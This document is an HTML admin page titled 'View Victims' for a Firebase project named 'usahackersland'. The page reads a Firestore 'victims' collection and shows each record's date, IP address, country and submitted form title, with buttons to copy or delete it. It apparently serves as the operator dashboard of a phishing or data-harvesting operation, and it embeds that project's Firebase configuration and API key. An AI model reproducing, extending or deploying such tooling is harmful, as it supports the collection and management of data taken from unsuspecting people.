<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🕵️‍♂️ View Victims</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
    h2 { text-align: center; margin-bottom: 20px; }
    table { width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    th, td { padding: 12px 15px; border: 1px solid #ddd; text-align: left; }
    th { background: #333; color: #fff; }
    tr:hover { background-color: #f1f1f1; }
    .actions button { margin-right: 5px; padding: 5px 10px; border: none; border-radius: 5px; cursor: pointer; }
    .delete-btn { background: #e74c3c; color: #fff; }
    .copy-btn { background: #3498db; color: #fff; }
  </style>
</head>
<body>
  <h2>📍 View Victims</h2>
  <table>
    <thead>
      <tr>
        <th>📅 Date</th>
        <th>🌍 IP Address</th>
        <th>🚩 Country</th>
        <th>🧾 Form Title</th>
        <th>⏰ Submitted</th>
        <th>⚙️ Actions</th>
      </tr>
    </thead>
    <tbody id="victimsTable">
      <!-- Dynamic rows will go here -->
    </tbody>
  </table>  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getFirestore, collection, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
      authDomain: "usahackersland.firebaseapp.com",
      projectId: "usahackersland",
      storageBucket: "usahackersland.appspot.com",
      messagingSenderId: "588407428267",
      appId: "1:588407428267:web:7c4898cbb62efd3d5953ee",
      measurementId: "G-ZJ05T7YNSQ"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    async function loadVictims() {
      const querySnapshot = await getDocs(collection(db, "victims"));
      const table = document.getElementById("victimsTable");
      table.innerHTML = "";

      querySnapshot.forEach(docSnap => {
        const data = docSnap.data();
        const row = document.createElement("tr");

        row.innerHTML = `
          <td>${data.date || "-"}</td>
          <td>${data.ip || "-"}</td>
          <td>${data.country || "-"}</td>
          <td>${data.formTitle || "-"}</td>
          <td>${data.timestamp || "-"}</td>
          <td class="actions">
            <button class="copy-btn" onclick="copyData('${docSnap.id}')">📋 Copy</button>
            <button class="delete-btn" onclick="deleteVictim('${docSnap.id}')">🗑️ Delete</button>
          </td>
        `;

        table.appendChild(row);
      });
    }

    window.copyData = async (id) => {
      const docSnap = await getDocs(collection(db, "victims"));
      const data = [...docSnap.docs].find(doc => doc.id === id)?.data();
      if (data) {
        const text = JSON.stringify(data, null, 2);
        navigator.clipboard.writeText(text);
        alert("Copied to clipboard");
      }
    };

    window.deleteVictim = async (id) => {
      if (confirm("Are you sure you want to delete this victim?")) {
        await deleteDoc(doc(db, "victims", id));
        loadVictims();
      }
    };

    loadVictims();
  </script></body>
</html>
